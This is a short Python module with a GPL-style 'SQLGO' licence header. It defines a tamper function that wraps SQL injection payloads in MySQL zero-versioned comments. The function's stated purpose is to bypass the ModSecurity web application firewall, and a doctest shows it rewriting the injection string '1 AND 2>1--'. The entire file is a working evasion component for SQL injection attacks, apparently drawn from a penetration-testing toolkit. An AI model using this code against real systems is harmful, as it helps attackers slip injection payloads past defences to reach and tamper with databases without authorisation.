"""
# SQLGO License - Version 1.1

Copyright (C) 2023-2024 Heisenberg

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""

def tamper(payload, **kwargs):
    """
    Embraces complete query with (MySQL) zero-versioned comment

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0

    Notes:
        * Useful to bypass ModSecurity WAF

    >>> tamper('1 AND 2>1--')
    '1 /*!00000AND 2>1*/--'
    """

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!00000%s*/%s" % (payload[:payload.find(' ')], payload[payload.find(' ') + 1:], postfix)

    return retVal